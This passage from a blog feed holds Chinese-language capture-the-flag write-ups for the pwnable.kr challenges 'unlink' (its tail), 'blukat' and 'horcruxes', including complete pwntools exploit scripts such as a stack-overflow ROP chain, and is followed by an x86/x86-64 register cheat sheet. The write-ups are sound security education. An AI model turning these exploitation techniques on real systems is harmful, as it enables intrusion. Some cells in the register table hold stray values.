class="line"><span class="comment"># pg = cyclic_gen ()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote (HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process (elf.path, env=env)</span><br><span class="line">shell_addr = <span class="number">0x080484eb</span></span><br><span class="line"></span><br><span class="line">conn.recvuntil (<span class="string">&#x27;here is stack address leak: &#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(conn.recv (<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">log.info (<span class="string">&#x27;Get stack address: % s&#x27;</span> % <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">conn.recvuntil (<span class="string">&#x27;here is heap address leak: &#x27;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(conn.recv (<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">log.info (<span class="string">&#x27;Get heap address: % s&#x27;</span> % <span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">fd = heap_addr + <span class="number">8</span> + <span class="number">4</span></span><br><span class="line">bk = stack_addr + <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause ()</span></span><br><span class="line">conn.sendlineafter (<span class="string">&#x27;now that you have leaks, get shell!\n&#x27;</span>, p32 (shell_addr) +  <span class="string">&#x27;a&#x27;</span> * (<span class="number">8</span> - <span class="number">4</span> + <span class="number">4</span> + <span class="number">4</span>) + p32 (fd) + p32 (bk))</span><br><span class="line"></span><br><span class="line">conn.interactive ()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="blukat-3-pt"><a href="#blukat-3-pt" class="headerlink" title="blukat (3 pt)"></a>blukat (3 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> flag [<span class="number">100</span>];</span><br><span class="line"><span class="type">char</span> password [<span class="number">100</span>];</span><br><span class="line"><span class="type">char</span>* key = <span class="string">&quot;3\rG [S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">calc_flag</span><span class="params">(<span class="type">char</span>* s)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(s); i++)&#123;</span><br><span class="line">        flag [i] = s [i] ^ key [i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;% s\n&quot;</span>, flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    FILE* fp = fopen (<span class="string">&quot;/home/blukat/password&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fgets (password, <span class="number">100</span>, fp);</span><br><span class="line">    <span class="type">char</span> buf [<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;guess the password!\n&quot;</span>);</span><br><span class="line">    fgets (buf, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(password, buf))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;congrats! here is your flag: &quot;</span>);</span><br><span class="line">        calc_flag (password);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;wrong guess!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是一道很迷惑的题，乍一看 buf 处可以溢出 28 个字节，但是这个题和溢出没有任何关系。最后的目的是我们需要输入一个 password，相等的话就给 flag，不然就 exit，和溢出相关的就只有 fgets 以后到 strcmp 之前这段，这之后的代码我们完全不可控制，首先我们不可能知道 password，所以不会进 calc_flag 的分支，但是进另一个分支就直接 exit 了，连 main 的 return 都没执行，所以这个题和溢出没有任何关系。</p><p>所以我们就得想办法拿到 password，想办法从程序里弄已经是不可能了，就只能考虑其他办法，直接 cat，返回 <code>cat: password: Permission denied</code>，但是我们再 head 一下，发现还是返回的 <code>cat: password: Permission denied</code>，所以，这句话就是 password 的内容，并且我们是可读的，看一下 password 的权限，是 <code>-rw-r-----</code>，并且属于 blukat_pwn 组，而正好我们也是 blukat_pwn，所以 password 本身就是可读的，问题就简单很多了，直接 <code>cat password | ./blukat</code> 即可。</p><p>其实仔细想想，这题才 3 分，前一个 unlink 都 10 分，所以这题肯定不会太复杂。</p><h1 id="horcruxes-7-pt"><a href="#horcruxes-7-pt" class="headerlink" title="horcruxes (7 pt)"></a>horcruxes (7 pt)</h1><p>这次没有给源码了，直接给了二进制程序，IDA 分析一下，上来就看见个 seccomp，所以还是个沙箱题。题目给了个 hint，说伏地魔把分裂的灵魂藏在了 7 个魂器里，正好题目里有 ABCDEFG 一共 7 个函数，先看一下最开始的 init_ABCDEFG。首先从 urandom 里读了 4 个字节到 buf 里，然后用 buf [0] 作为随机数的种子，之后 random 出来 7 个数，求和放入 sum 里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">init_ABCDEFG</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">//eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">//eax</span></span><br><span class="line">  <span class="type">char</span> buf [<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  fd = open (<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (read (fd, buf, <span class="number">4u</span>) != <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/dev/urandom error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  close (fd);</span><br><span class="line">  srand (*buf);</span><br><span class="line">  a = <span class="number">0xDEADBEEF</span> * rand () % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  b = <span class="number">0xDEADBEEF</span> * rand () % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  c = <span class="number">0xDEADBEEF</span> * rand () % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  d = <span class="number">0xDEADBEEF</span> * rand () % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  e = <span class="number">0xDEADBEEF</span> * rand () % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  f = <span class="number">0xDEADBEEF</span> * rand () % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  v0 = rand ();</span><br><span class="line">  g = <span class="number">0xDEADBEEF</span> * v0 % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  result = f + e + d + c + b + a + <span class="number">0xDEADBEEF</span> * v0 % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  sum = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主函数在 rop_me 里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ropme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s [<span class="number">100</span>]; <span class="comment">// [esp+4h] [ebp-74h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+68h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Select Menu:&quot;</span>);</span><br><span class="line">  __isoc99_scanf (<span class="string">&quot;% d&quot;</span>, &amp;v2);</span><br><span class="line">  getchar ();</span><br><span class="line">  <span class="keyword">if</span> (v2 == a)</span><br><span class="line">  &#123;</span><br><span class="line">    A ();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (v2 == b)</span><br><span class="line">  &#123;</span><br><span class="line">    B ();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (v2 == c)</span><br><span class="line">  &#123;</span><br><span class="line">    C ();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (v2 == d)</span><br><span class="line">  &#123;</span><br><span class="line">    D ();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (v2 == e)</span><br><span class="line">  &#123;</span><br><span class="line">    E ();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (v2 == f)</span><br><span class="line">  &#123;</span><br><span class="line">    F ();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (v2 == g)</span><br><span class="line">  &#123;</span><br><span class="line">    G ();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How many EXP did you earned? : &quot;</span>);</span><br><span class="line">    gets (s);</span><br><span class="line">    <span class="keyword">if</span> (atoi (s) == sum )</span><br><span class="line">    &#123;</span><br><span class="line">      fd = open (<span class="string">&quot;flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      s [read (fd, s, <span class="number">0x64</span>u)] = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(s);</span><br><span class="line">      close (fd);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;d better get more experience to kill Voldemort&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 a 到 f 就是刚才的随机数，很明显我们不会知道那些随机数是什么，所以就进入了最后一个分支，这里有一个 gets，很明显的一个栈溢出，并且如果我们输入的字符串刚好就是 sum 的话就给我们 flag，所以这个题我们不一定需要 getshell，目的就是想办法泄漏出 sum。</p><p>没有开启 canary，所以这个栈溢出可以让我们任意地址跳转，首先我们肯定想直接调转到 open 那里，但是这里用的是 gets 获取的字符串，而 open flag 那里的地址为 0x080A010E，其中包含了 0x0a，而 gets 读取的时候遇到 0x0a 的时候就会停下，所以我们只能跳转到不包含 0x0a 的地址。再往前看，发现 A，B，C 那几个函数刚好在 0x0a 地址的前面，例如 A 的地址为 * 0x*0809FE4B，而调用 A 的时候刚好可以泄漏出 a 的值，这样从 A 到 G 依次调用一遍，我们就可以知道 a 到 g 的值，然后就能计算出 sum，最后再跳转到 ropme 执行一遍验证输入 sum 就可以拿到 flag，刚好 main 函数里 call ropme 的地址为 * 0x*0809FFFC，也不包含 0x0a，所以就可以形成一个 rop 链。</p><p>最终的 exp 如下。需要注意的是只有当 sum 是个负数的时候才能成功，具体原因还不清楚，debug 的时候发现若 sum 是个正数，atoi 的时候会失败，只有负数才会成功，所以需要多尝试几次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> <span class="built_in">compile</span> <span class="keyword">as</span> re_compile</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">HOST = <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">PORT = <span class="number">9032</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.clear (arch=&#x27;amd64&#x27;)</span></span><br><span class="line">context.update (terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">context.update (log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF (&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF (<span class="string">&quot;./horcruxes&quot;</span>)</span><br><span class="line">pg = cyclic_gen ()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote (HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process (elf.path, env=env)</span><br><span class="line"></span><br><span class="line">A = <span class="number">0x0809FE4B</span></span><br><span class="line">B = <span class="number">0x0809FE6A</span></span><br><span class="line">C = <span class="number">0x0809FE89</span></span><br><span class="line">D = <span class="number">0x0809FEA8</span></span><br><span class="line">E = <span class="number">0x0809FEC7</span></span><br><span class="line">F = <span class="number">0x0809FEE6</span></span><br><span class="line">G = <span class="number">0x0809FF05</span></span><br><span class="line">ropme = <span class="number">0x0809FFFC</span></span><br><span class="line">conn.sendlineafter (<span class="string">&#x27;Select Menu:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.sendlineafter (<span class="string">&#x27;How many EXP did you earned? : &#x27;</span>, pg.get (<span class="number">116</span>) + p32 (<span class="number">4</span>) + p32 (A) + p32 (B) + p32 (C) + p32 (D) + p32 (E) + p32 (F) + p32 (G) + p32 (ropme))</span><br><span class="line">conn.recvline ()</span><br><span class="line"></span><br><span class="line">findall = re_compile (<span class="string">r&#x27;\(EXP \+(-?\d+)\)&#x27;</span>).findall</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">int</span>(findall (conn.recvline ())[<span class="number">0</span>])</span><br><span class="line">log.info (<span class="string">&#x27;Get a: % d&#x27;</span> % a)</span><br><span class="line">b = <span class="built_in">int</span>(findall (conn.recvline ())[<span class="number">0</span>])</span><br><span class="line">log.info (<span class="string">&#x27;Get b: % d&#x27;</span> % b)</span><br><span class="line">c = <span class="built_in">int</span>(findall (conn.recvline ())[<span class="number">0</span>])</span><br><span class="line">log.info (<span class="string">&#x27;Get c: % d&#x27;</span> % c)</span><br><span class="line">d = <span class="built_in">int</span>(findall (conn.recvline ())[<span class="number">0</span>])</span><br><span class="line">log.info (<span class="string">&#x27;Get d: % d&#x27;</span> % d)</span><br><span class="line">e = <span class="built_in">int</span>(findall (conn.recvline ())[<span class="number">0</span>])</span><br><span class="line">log.info (<span class="string">&#x27;Get e: % d&#x27;</span> % e)</span><br><span class="line">f = <span class="built_in">int</span>(findall (conn.recvline ())[<span class="number">0</span>])</span><br><span class="line">log.info (<span class="string">&#x27;Get f: % d&#x27;</span> % f)</span><br><span class="line">g = <span class="built_in">int</span>(findall (conn.recvline ())[<span class="number">0</span>])</span><br><span class="line">log.info (<span class="string">&#x27;Get g: % d&#x27;</span> % g)</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">str</span>(a+b+c+d+e+f+g)</span><br><span class="line">log.info (<span class="string">&#x27;Sum: &#x27;</span> + s)</span><br><span class="line">conn.sendlineafter (<span class="string">&#x27;Select Menu:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.sendlineafter (<span class="string">&#x27;How many EXP did you earned? : &#x27;</span>, s)</span><br><span class="line">log.success (<span class="string">&#x27;Got flag: &#x27;</span> + conn.recvline ())</span><br><span class="line"></span><br><span class="line"><span class="comment"># conn.interactive ()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Pwnable at korea writeups of section &quot;Toddler&#39;s Bottle&quot;. Including &quot;fd&quot;, &quot;collision&quot;, &quot;bof&quot;, &quot;flag&quot;, &quot;passcode&quot;, &quot;random&quot;, &quot;input&quot;, &quot;leg&quot;, &quot;mistake&quot;, &quot;shellshock&quot;, &quot;conin1&quot;, &quot;blackjack&quot;, &quot;lotto&quot;, &quot;cmd1&quot;, &quot;cmd2&quot;, &quot;uaf&quot;, &quot;memcpy&quot;, &quot;asm&quot;, &quot;unlink&quot;, &quot;blukat&quot;, &quot;horcruxes&quot;.</summary>
    
    
    
    <category term="CTF" scheme="https://srpopty.github.io/categories/CTF/"/>
    
    
    <category term="WriteUp" scheme="https://srpopty.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Register CheatSheet</title>
    <link href="https://srpopty.github.io/2021/08/10/Register-CheatSheet/"/>
    <id>https://srpopty.github.io/2021/08/10/Register-CheatSheet/</id>
    <published>2021-08-10T11:07:22.000Z</published>
    <updated>2021-08-10T11:07:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="x86-32bit"><a href="#x86-32bit" class="headerlink" title="x86-32bit"></a>x86-32bit</h1><table><thead><tr><th align="center">Register</th><th align="center">Lower 16 bits</th><th align="center">High 8 bits of lower 16 bits</th><th align="center">Low 8 bits of lower 16 bits</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">eax</td><td align="center">ax</td><td align="center">ah</td><td align="center">al</td><td align="center">accumulator</td></tr><tr><td align="center">ebx</td><td align="center">bx</td><td align="center">bh</td><td align="center">bl</td><td align="center">base register</td></tr><tr><td align="center">ecx</td><td align="center">cx</td><td align="center">ch</td><td align="center">cl</td><td align="center">counter register</td></tr><tr><td align="center">edx</td><td align="center">dx</td><td align="center">dh</td><td align="center">dl</td><td align="center">data register - can be used for I/O port access and arithmetic functions</td></tr><tr><td align="center">esi</td><td align="center">si</td><td align="center"></td><td align="center"></td><td align="center">source index register</td></tr><tr><td align="center">edi</td><td align="center">di</td><td align="center"></td><td align="center"></td><td align="center">destination index register</td></tr><tr><td align="center">ebp</td><td align="center">bp</td><td align="center"></td><td align="center"></td><td align="center">base pointer register</td></tr><tr><td align="center">esp</td><td align="center">sp</td><td align="center"></td><td align="center"></td><td align="center">Stack pointer</td></tr><tr><td align="center">eip</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">instruction pointer</td></tr><tr><td align="center">flags</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">flags</td></tr></tbody></table><h1 id="x86-64bit"><a href="#x86-64bit" class="headerlink" title="x86-64bit"></a>x86-64bit</h1><table><thead><tr><th align="center">Register</th><th align="center">Lower 32 bits</th><th align="center">Lower 16 bits</th><th align="center">High 8 bits of lower 16 bits</th><th align="center">Low 8 bits of lower 16 bits</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">rax</td><td align="center">eax</td><td align="center">ax</td><td align="center">ah</td><td align="center">al</td><td align="center">accumulator</td></tr><tr><td align="center">rbx</td><td align="center">ebx</td><td align="center">bx</td><td align="center">bh</td><td align="center">bl</td><td align="center">base register</td></tr><tr><td align="center">rcx</td><td align="center">ecx</td><td align="center">cx</td><td align="center">ch</td><td align="center">cl</td><td align="center">counter register</td></tr><tr><td align="center">rdx</td><td align="center">edx</td><td align="center">dx</td><td align="center">dh</td><td align="center">dl</td><td align="center">data register - can be used for I/O port access and arithmetic functions</td></tr><tr><td align="center">rsi</td><td align="center">esi</td><td align="center">si</td><td align="center"></td><td align="center">sil</td><td align="center">source index register</td></tr><tr><td align="center">rdi</td><td align="center">edi</td><td align="center">di</td><td align="center"></td><td align="center">dil</td><td align="center">destination index register</td></tr><tr><td align="center">rbp</td><td align="center">ebp</td><td align="center">bp</td><td align="center"></td><td align="center">bpl</td><td align="center">base pointer register</td></tr><tr><td align="center">rsp</td><td align="center">esp</td><td align="center">sp</td><td align="center"></td><td align="center">spl</td><td align="center">Stack pointer</td></tr><tr><td align="center">r8</td><td align="center">r8d</td><td align="center">r8w</td><td align="center"></td><td align="center">r8b</td><td align="center"></td></tr><tr><td align="center">r9</td><td align="center">r9d</td><td align="center">r9w</td><td align="center"></td><td align="center">r9b</td><td align="center"></td></tr><tr><td align="center">r10</td><td align="center">r10d</td><td align="center">r10w</td><td align="center"></td><td align="center">r10b</td><td align="center"></td></tr><tr><td align="center">r11</td><td align="center">r11d</td><td align="center">r11w</td><td align="center"></td><td align="center">r11b</td><td align="center"></td></tr><tr><td align="center">r12</td><td align="center">r12d</td><td align="center">r12w</td><td align="center"></td><td align="center">r12b</td><td align="center"></td></tr><tr><td align="center">r13</td><td align="center">r13d</td><td align="center">r13w</td><td align="center"></td><td align="center">r13b</td><td align="center"></td></tr><tr><td align="center">r14</td><td align="center">r14d</td><td align="center">r14w</td><td align="center"></td><td align="center">r14b</td><td align="center"></td></tr><tr><td align="center">r15</td><td align="center">R15d</td><td align="center">r15w</td><td align="center"></td><td align="center">r15b</td><td align="center"></td></tr><tr><td align="center">rip</td><td align="center"></td><td align="center">0x09</td><td align="center"></td><td align="center"></td><td align="center">instruction pointer</td></tr><tr><td align="center">rflags</td><td align="center"></td><td align="center">0x0a</td><td align="center"></td><td align="center"></td><td align="center">flags</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">Common registers cheat sheets.</summary>
    
    
    
    <category term="CheatSheet" scheme="https://srpopty.github.io/categories/CheatSheet/"/>
    
    
    <category term="Pwn" scheme="https://srpopty.github.io/tags/Pwn/"/>
    
  </entry>
  
</feed>
